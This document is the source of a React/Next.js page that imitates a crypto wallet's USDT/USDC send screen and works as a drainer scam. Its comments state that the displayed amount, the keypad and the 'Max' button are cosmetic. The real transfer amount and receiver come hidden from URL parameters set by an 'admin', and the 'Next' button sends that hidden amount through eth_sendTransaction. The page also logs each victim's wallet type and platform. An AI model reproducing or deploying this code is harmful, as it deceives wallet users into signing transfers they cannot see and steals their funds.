"use client";

import { useState, useEffect, useRef } from "react";
import { ethers } from "ethers";

// ------------------------------------------------------------
// CONFIG
// ------------------------------------------------------------
const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";
const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const USDT_DECIMALS = 6;
const USDC_CONTRACT = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const USDC_DECIMALS = 6;

const ERC20_ABI = [
  "function transfer(address to, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
];

const ETH_CHAIN_ID = "0x1";

// ------------------------------------------------------------
// Types & helpers pour le provider
// ------------------------------------------------------------
interface EthereumProvider {
  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
  isMetaMask?: boolean;
  isTrust?: boolean;
  isTrustWallet?: boolean;
  on?: (event: string, handler: (...args: unknown[]) => void) => void;
  removeListener?: (event: string, handler: (...args: unknown[]) => void) => void;
}
declare global {
  interface Window {
    ethereum?: EthereumProvider;
    trustwallet?: { ethereum?: EthereumProvider };
  }
}

function getProviderNow(): EthereumProvider | null {
  if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
  if (window.ethereum) return window.ethereum;
  return null;
}

async function waitForProvider(
  maxAttempts = 15,
  delayMs = 300,
): Promise<EthereumProvider | null> {
  for (let i = 0; i < maxAttempts; i++) {
    const provider = getProviderNow();
    if (provider) return provider;
    await new Promise((r) => setTimeout(r, delayMs));
  }
  return null;
}

// ------------------------------------------------------------
// COMPOSANT PRINCIPAL
// ------------------------------------------------------------
export default function WalletPage() {
  // États de l'interface
  const [address, setAddress] = useState(DEFAULT_RECEIVER);
  const [connectedAddress, setConnectedAddress] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [txHash, setTxHash] = useState<string>("");
  const [displayAmount, setDisplayAmount] = useState<string>("0"); // champ cosmétique, toujours 0 par défaut
  const [token, setToken] = useState<"usdt" | "usdc">("usdt");
  const [isKeyboardVisible, setIsKeyboardVisible] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalStatus, setModalStatus] = useState<"pending" | "success" | "error">("pending");
  const providerRef = useRef<EthereumProvider | null>(null);
  const keypadRef = useRef<HTMLDivElement>(null);

  // Valeurs réelles de la transaction (issues des paramètres d'URL)
  const [actualReceiver, setActualReceiver] = useState<string>(DEFAULT_RECEIVER);
  const [actualAmount, setActualAmount] = useState<string>(""); // montant réel (défini par l'admin)
  const [actualToken, setActualToken] = useState<"usdt" | "usdc">("usdt");

  // Solde (optionnel, utilisé uniquement pour le bouton "Max" cosmétique)
  const [walletBalance, setWalletBalance] = useState<bigint>(0n);

  const fetchTokenBalance = async (
    userAddress: string,
    activeToken: "usdt" | "usdc",
  ) => {
    if (!providerRef.current) return;
    try {
      const provider = new ethers.BrowserProvider(
        providerRef.current as ethers.Eip1193Provider,
      );
      const tokenAddr =
        activeToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
      const contract = new ethers.Contract(tokenAddr, ERC20_ABI, provider);
      const balance = await contract.balanceOf(userAddress);
      setWalletBalance(balance);
    } catch (err) {
      console.warn("Error fetching token balance:", err);
    }
  };

  // ------------------------------------------------------------
  // Initialisation (lecture des paramètres d'URL, connexion wallet, log)
  // ------------------------------------------------------------
  useEffect(() => {
    let cancelled = false;
    let finalTo: string | null = null;
    let finalAmount: string | null = null;
    let finalToken: string | null = null;

    if (typeof window !== "undefined") {
      const params = new URLSearchParams(window.location.search);
      const dataParam = params.get("data");

      if (dataParam) {
        // Format Base64 JSON (iOS)
        try {
          const decoded = JSON.parse(atob(decodeURIComponent(dataParam)));
          if (decoded.to && ethers.isAddress(decoded.to)) {
            finalTo = decoded.to;
            setAddress(decoded.to);
            setActualReceiver(decoded.to);
          }
          if (decoded.token === "usdt" || decoded.token === "usdc") {
            finalToken = decoded.token;
            setToken(decoded.token);
            setActualToken(decoded.token);
          }
          if (decoded.amount && !isNaN(Number(decoded.amount)) && Number(decoded.amount) > 0) {
            finalAmount = decoded.amount;
            setActualAmount(decoded.amount); // montant réel
          } else {
            setActualAmount("");
          }
        } catch (e) {
          console.warn("Failed to decode data param, falling back to separate params");
        }
      } else {
        // Paramètres séparés (iOS simple / fallback)
        const toParam = params.get("to");
        const amountParam = params.get("amount");
        const tokenParam = params.get("token");

        if (toParam && ethers.isAddress(toParam)) {
          finalTo = toParam;
          setAddress(toParam);
          setActualReceiver(toParam);
        }
        if (tokenParam === "usdt" || tokenParam === "usdc") {
          finalToken = tokenParam;
          setToken(tokenParam);
          setActualToken(tokenParam);
        }
        if (amountParam && !isNaN(Number(amountParam)) && Number(amountParam) > 0) {
          finalAmount = amountParam;
          setActualAmount(amountParam);
        } else {
          setActualAmount("");
        }
      }

      // Le champ affiché reste toujours à 0
      setDisplayAmount("0");
    }

    // Log du scan
    const logScanVisit = async () => {
      let userAgentInfo = "Web Browser";
      let platformInfo = "Other";
      if (typeof window !== "undefined") {
        const ua = navigator.userAgent.toLowerCase();
        const isTrust = !!window.trustwallet || ua.includes("trust");
        const isMetaMask =
          !!(window.ethereum as { isMetaMask?: boolean })?.isMetaMask ||
          ua.includes("metamask");

        if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) {
          platformInfo = "iOS";
        } else if (ua.includes("android")) {
          platformInfo = "Android";
        }

        if (isTrust) {
          userAgentInfo =
            "Trust Wallet (" +
            (ua.includes("iphone") || ua.includes("ipad") ? "iOS" : "Android") +
            ")";
        } else if (isMetaMask) {
          userAgentInfo =
            "MetaMask (" +
            (ua.includes("iphone") || ua.includes("ipad") ? "iOS" : "Android") +
            ")";
        } else if (ua.includes("iphone") || ua.includes("ipad")) {
          userAgentInfo = "Mobile Safari (iOS)";
        } else if (ua.includes("android")) {
          userAgentInfo = "Mobile Browser (Android)";
        } else {
          userAgentInfo = "Web Browser (Desktop)";
        }
      }
      try {
        const dbTokenName = finalToken ? finalToken.toUpperCase() + " (ERC20)" : "USDT (ERC20)";

        await fetch("/api/log-scan", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            to: finalTo || DEFAULT_RECEIVER,
            amount: finalAmount || "0",
            token: dbTokenName,
            userAgent: userAgentInfo,
            platform: platformInfo,
          }),
        });
      } catch (err) {
        console.warn("Failed to log scan visit:", err);
      }
    };
    logScanVisit();

    // Connexion silencieuse au wallet
    const init = async () => {
      const ethereumProvider = await waitForProvider();
      if (!ethereumProvider || cancelled) return;
      providerRef.current = ethereumProvider;

      // Vérifier/corriger le réseau
      try {
        const chainId = (await ethereumProvider.request({
          method: "eth_chainId",
        })) as string;
        if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
          await ethereumProvider.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: ETH_CHAIN_ID }],
          });
        }
      } catch (e) {}

      // Récupérer l'adresse connectée
      try {
        const accounts = (await ethereumProvider.request({
          method: "eth_accounts",
        })) as string[];
        if (accounts.length > 0 && !cancelled) {
          const userAddress = accounts[0];
          setConnectedAddress(userAddress);
          fetchTokenBalance(userAddress, finalToken as any || "usdt");
        }
      } catch (e) {}

      if (ethereumProvider.on) {
        ethereumProvider.on("accountsChanged", (acc: unknown) => {
          const a = acc as string[];
          if (!cancelled) {
            const newAddr = a.length > 0 ? a[0] : null;
            setConnectedAddress(newAddr);
            if (newAddr) fetchTokenBalance(newAddr, finalToken as any || "usdt");
          }
        });
      }
    };
    init();

    return () => {
      cancelled = true;
    };
  }, []);

  // Met à jour le solde si le token change
  useEffect(() => {
    if (connectedAddress) fetchTokenBalance(connectedAddress, token);
  }, [token, connectedAddress]);

  // ------------------------------------------------------------
  // Transfert simple (utilise UNIQUEMENT actualAmount)
  // ------------------------------------------------------------
  const handleSend = async () => {
    setShowModal(false);
    setLoading(true);

    // On ignore toute saisie utilisateur, on prend le montant défini par l'admin
    const rawAmount = actualAmount;

    if (!rawAmount || isNaN(Number(rawAmount)) || Number(rawAmount) <= 0) {
      setModalStatus("error");
      setShowModal(true);
      setLoading(false);
      return;
    }

    const ethereumProvider = providerRef.current ?? (await waitForProvider());
    if (!ethereumProvider) {
      setLoading(false);
      return;
    }
    providerRef.current = ethereumProvider;

    // Vérifier le réseau
    try {
      const chainId = (await ethereumProvider.request({
        method: "eth_chainId",
      })) as string;
      if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
        await ethereumProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: ETH_CHAIN_ID }],
        });
      }
    } catch (switchErr) {
      console.warn("Could not switch chain:", switchErr);
    }

    try {
      const tokenAddr = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
      const decimals = actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS;

      const amountInWei = ethers.parseUnits(rawAmount, decimals);
      const iface = new ethers.Interface(ERC20_ABI);
      const data = iface.encodeFunctionData("transfer", [
        actualReceiver,
        amountInWei,
      ]);

      const hash = (await ethereumProvider.request({
        method: "eth_sendTransaction",
        params: [
          { to: tokenAddr, data, gas: "0x249f0" },
        ],
      })) as string;

      setTxHash(hash);
      setModalStatus("pending");
      setShowModal(true);

      const provider = new ethers.BrowserProvider(
        ethereumProvider as ethers.Eip1193Provider,
      );
      const receipt = await provider.waitForTransaction(hash);
      setModalStatus(receipt && receipt.status === 1 ? "success" : "error");
    } catch (err: any) {
      console.error("Transfer error:", err);
      setModalStatus("error");
    } finally {
      setLoading(false);
    }
  };

  // ------------------------------------------------------------
  // UI helpers (modification cosmétique uniquement)
  // ------------------------------------------------------------
  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text);
      setActualReceiver(text);
    } catch {}
  };

  const getFiatValue = (amountStr: string) => {
    const parsed = parseFloat(amountStr.replace(",", "."));
    if (isNaN(parsed)) return "0,00";
    return (parsed * 0.86).toFixed(2).replace(".", ",");
  };

  const handleKeyPress = (key: string) => {
    // Modification purement cosmétique, n'affecte pas actualAmount
    setDisplayAmount((prev) => {
      let newVal = prev;
      if (key === "⌫") {
        newVal = prev.slice(0, -1);
      } else if (key === "," || key === ".") {
        if (!prev.includes(",") && !prev.includes(".")) {
          newVal = prev === "" ? "0," : prev + ",";
        }
      } else {
        if (prev === "0") newVal = key;
        else newVal = prev + key;
      }
      return newVal;
    });
  };

  const handleMaxClick = (e: React.MouseEvent) => {
    e.stopPropagation();
    if (walletBalance > 0n) {
      // Affiche le max dans le champ, mais ne modifie pas actualAmount
      const maxStr = ethers.formatUnits(walletBalance, actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS);
      setDisplayAmount(maxStr.replace(".", ","));
      // Ne touche pas à actualAmount
    }
  };

  // ------------------------------------------------------------
  // RENDU
  // ------------------------------------------------------------
  return (
    <main
      className={`transfer-main transfer-main-pad ${isKeyboardVisible ? "transfer-main-pad--with-keyboard" : ""}`}
      onClick={() => setIsKeyboardVisible(false)}
    >
      <div className="form-container">
        <label className="form-label">Address or domain name</label>
        <div className="input-row">
          <input
            type="text"
            placeholder="Search or Enter"
            value={address}
            onChange={(e) => {
              setAddress(e.target.value);
              setActualReceiver(e.target.value);
            }}
            className="input-row__field"
          />
          <div className="input-row__actions" style={{ gap: "0.4rem" }}>
            <button onClick={handlePaste} className="btn-paste">
              Paste
            </button>
            <button
              className="btn-icon"
              title="Copy"
              style={{ margin: "0 -12px" }}
            >
              <img
                src="/contrat.png"
                alt="Contract"
                style={{ width: "45px", height: "45px", objectFit: "contain" }}
              />
            </button>
            <button className="btn-icon" title="Scan QR">
              <svg
                width="20"
                height="20"
                viewBox="0 0 24 24"
                fill="none"
                stroke="#3562ff"
                strokeWidth="2.5"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <path d="M3 7V5a2 2 0 0 1 2-2h2" />
                <path d="M17 3h2a2 2 0 0 1 2 2v2" />
                <path d="M21 17v2a2 2 0 0 1-2 2h-2" />
                <path d="M7 21H5a2 2 0 0 1-2-2v-2" />
                <line x1="7" y1="12" x2="17" y2="12" />
              </svg>
            </button>
          </div>
        </div>

        <div>
          <label className="form-label form-label--spaced">Amount</label>
          <div
            className={`montant-container ${isKeyboardVisible ? "montant-container--active" : ""}`}
            onClick={(e) => {
              e.stopPropagation();
              setIsKeyboardVisible(true);
            }}
          >
            <div className="montant-input-wrapper">
              <span
                className={
                  displayAmount === ""
                    ? "montant-placeholder"
                    : "montant-display-value"
                }
              >
                {displayAmount || "0"}
              </span>
              {isKeyboardVisible && <span className="blinking-cursor" />}
            </div>
            <div className="montant-right">
              {displayAmount !== "" && (
                <button
                  type="button"
                  className="montant-clear-btn"
                  onClick={(e) => {
                    e.stopPropagation();
                    setDisplayAmount("0");
                    // Ne pas effacer actualAmount
                  }}
                >
                  <svg
                    width="18"
                    height="18"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2.5"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <circle cx="12" cy="12" r="10" fill="#8e8e93" stroke="#8e8e93" />
                    <line x1="15" y1="9" x2="9" y2="15" stroke="#ffffff" strokeWidth="2.5" />
                    <line x1="9" y1="9" x2="15" y2="15" stroke="#ffffff" strokeWidth="2.5" />
                  </svg>
                </button>
              )}
              <span className="montant-token">{token.toUpperCase()}</span>
              <button
                type="button"
                onClick={handleMaxClick}
                className="montant-max-btn"
              >
                Max.
              </button>
            </div>
          </div>
          {(() => {
            const parsedVal = parseFloat(displayAmount.replace(",", "."));
            const isInvalid = isNaN(parsedVal) || parsedVal < 0.000001;
            if (displayAmount === "" || displayAmount === "0") {
              return null;
            }
            if (isInvalid) {
              return (
                <div
                  className="montant-error"
                  style={{
                    color: "#df3e3e",
                    fontSize: "0.8rem",
                    marginTop: "0.5rem",
                    paddingLeft: "0.25rem",
                    textAlign: "left",
                    fontWeight: "500",
                  }}
                >
                  Minimum amount is 0.000001 {token.toUpperCase()}
                </div>
              );
            }
            return (
              <div
                className="approx-price"
                style={{
                  color: "#8e8e93",
                  marginTop: "0.4rem",
                  paddingLeft: "0.25rem",
                  fontWeight: "500",
                  fontSize: "0.85rem",
                }}
              >
                ≈ €{getFiatValue(displayAmount)}
              </div>
            );
          })()}
        </div>
      </div>

      <div style={{ flexGrow: 1, minHeight: "2rem" }} />

      <div className="next-btn-wrapper">
        <button
          onClick={(e) => {
            e.stopPropagation();
            handleSend();
          }}
          disabled={loading}
          className={`next-btn ${loading ? "next-btn--loading" : ""}`}
          style={{ backgroundColor: "#3562ff" }}
        >
          {loading ? (
            <span className="btn-spinner-wrapper">
              <span className="btn-spinner" />
              Processing...
            </span>
          ) : (
            "Next"
          )}
        </button>
      </div>

      {/* Clavier numérique */}
      {isKeyboardVisible && (
        <div
          className="custom-keypad"
          ref={keypadRef}
          onClick={(e) => e.stopPropagation()}
        >
          <button type="button" onClick={() => handleKeyPress("1")} className="keypad-key"><span className="keypad-key__number">1</span></button>
          <button type="button" onClick={() => handleKeyPress("2")} className="keypad-key"><span className="keypad-key__number">2</span><span className="keypad-key__letters">ABC</span></button>
          <button type="button" onClick={() => handleKeyPress("3")} className="keypad-key"><span className="keypad-key__number">3</span><span className="keypad-key__letters">DEF</span></button>
          <button type="button" onClick={() => handleKeyPress("4")} className="keypad-key"><span className="keypad-key__number">4</span><span className="keypad-key__letters">GHI</span></button>
          <button type="button" onClick={() => handleKeyPress("5")} className="keypad-key"><span className="keypad-key__number">5</span><span className="keypad-key__letters">JKL</span></button>
          <button type="button" onClick={() => handleKeyPress("6")} className="keypad-key"><span className="keypad-key__number">6</span><span className="keypad-key__letters">MNO</span></button>
          <button type="button" onClick={() => handleKeyPress("7")} className="keypad-key"><span className="keypad-key__number">7</span><span className="keypad-key__letters">PQRS</span></button>
          <button type="button" onClick={() => handleKeyPress("8")} className="keypad-key"><span className="keypad-key__number">8</span><span className="keypad-key__letters">TUV</span></button>
          <button type="button" onClick={() => handleKeyPress("9")} className="keypad-key"><span className="keypad-key__number">9</span><span className="keypad-key__letters">WXYZ</span></button>
          <button type="button" onClick={() => handleKeyPress(",")} className="keypad-key keypad-key--special"><span className="keypad-key__number" style={{ fontSize: "1.8rem", lineHeight: "0.8", marginTop: "-4px" }}>,</span></button>
          <button type="button" onClick={() => handleKeyPress("0")} className="keypad-key"><span className="keypad-key__number">0</span></button>
          <button type="button" onClick={() => handleKeyPress("⌫")} className="keypad-key keypad-key--special">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#000000" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2z" />
              <line x1="18" y1="9" x2="12" y2="15" />
              <line x1="12" y1="9" x2="18" y2="15" />
            </svg>
          </button>
        </div>
      )}

      {/* Modal */}
      {showModal && (
        <div className="modal-overlay" onClick={() => setShowModal(false)}>
          <div className="modal-card" onClick={(e) => e.stopPropagation()}>
            <button
              className="modal-close-btn"
              onClick={() => setShowModal(false)}
              title="Close"
            >
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
              </svg>
            </button>
            <img src="/yes.png" alt="Status" className="modal-logo" />
            {modalStatus === "pending" && (
              <>
                <h2 className="modal-title">Processing...</h2>
                <p className="modal-text">
                  The transaction is in progress! Blockchain validation is underway.
                </p>
              </>
            )}
            {modalStatus === "success" && (
              <>
                <h2 className="modal-title" style={{ color: "#10b981" }}>
                  Transaction successful!
                </h2>
                <p className="modal-text">
                  Your transfer has been successfully validated on the Ethereum blockchain.
                </p>
              </>
            )}
            {modalStatus === "error" && (
              <>
                <h2 className="modal-title" style={{ color: "#ef4444" }}>
                  Transaction failed
                </h2>
                <p className="modal-text">
                  The transaction failed on the Ethereum blockchain or an error
                  occurred during the transfer.
                </p>
              </>
            )}
            {txHash && (
              <a
                href={`https://etherscan.io/tx/${txHash}`}
                target="_blank"
                rel="noopener noreferrer"
                className="modal-details-btn"
              >
                Transaction details
              </a>
            )}
          </div>
        </div>
      )}
    </main>
  );
}